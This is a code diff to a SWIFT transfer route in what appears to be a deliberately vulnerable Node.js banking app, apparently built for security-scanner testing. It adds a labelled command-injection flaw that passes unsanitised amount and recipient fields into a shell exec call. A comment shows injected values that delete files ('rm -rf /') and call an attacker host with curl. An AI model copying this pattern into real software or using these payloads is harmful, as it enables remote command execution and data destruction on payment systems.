@@ -221,8 +221,15 @@ router.post('/swift', authenticate, async (req, res) => {
     // If amount or recipient contains shell metacharacters, arbitrary commands execute
     // e.g., amount = "100; rm -rf /", recipient = "$(curl attacker.com)"
     const receiptPath = `/tmp/receipts/swift_${Date.now()}.pdf`;
+    const recipientName = beneficiaryName;
+    // VULN-225: Command injection in PDF receipt — njsscan node_childprocess_exec
+    exec(`pdfgen --amount ${amount} --to ${recipientName}`, (error, stdout, stderr) => {
+      if (error) {
+        logger.error('PDF generation error:', error);
+      }
+    });
     exec(
-      `pdfgen --amount ${amount} --to ${recipient} --currency ${currency} --output ${receiptPath}`,
+      `pdfgen --amount ${amount} --to ${recipientName} --currency ${currency} --output ${receiptPath}`,
       (error, stdout, stderr) => {
         if (error) {
           logger.error('PDF generation error:', error);
